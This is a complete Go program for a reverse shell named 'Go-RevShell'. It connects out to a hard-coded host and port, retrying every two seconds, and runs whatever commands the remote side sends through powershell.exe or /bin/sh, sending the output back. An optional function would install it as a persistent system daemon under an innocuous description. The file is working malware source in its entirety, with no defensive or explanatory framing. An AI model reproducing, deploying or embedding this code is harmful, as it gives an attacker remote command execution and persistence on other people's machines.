package main

import (
	"bufio"
	"log"
	"net"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/takama/daemon"
)

func main() {
	// daemonize()
	connectToClient("192.168.1.24", 1111)
}

func daemonize() {
	service, err := daemon.New("Go-RevShell", "Une tortue sur son dos", daemon.SystemDaemon)
	handleError(err)
	_, err = service.Install()
	handleError(err)
}

func connectToClient(host string, port int) {
	for {
		connexion, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
		if err != nil {
			time.Sleep(2 * time.Second)
		} else {
			connexion.Write([]byte("[+] Connected to server.\nType \"quit\" to close the shell properly or the process will die server side.\n"))
			var shell string
			if runtime.GOOS == "windows" {
				shell = "powershell.exe"
			} else {
				shell = "/bin/sh"
			}
			reverseShell(connexion, shell)
			connexion.Close()
		}
	}
}

func reverseShell(connexion net.Conn, shell string) {
	for {
		connexion.Write([]byte("[Go-RevShell@" + connexion.LocalAddr().String() + "] > "))
		clientEntry, err := bufio.NewReader(connexion).ReadString('\n')
		handleError(err)
		clientEntry = strings.TrimSuffix(clientEntry, "\n")
		cmdOutput, err := exec.Command(shell, clientEntry).Output()
		if clientEntry == "quit" {
			break
		}
		if err != nil {
			connexion.Write([]byte("[-] Unknown command.\n"))
		} else {
			connexion.Write(append(cmdOutput, "[+] Command sent.\n"...))
		}
	}
}

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
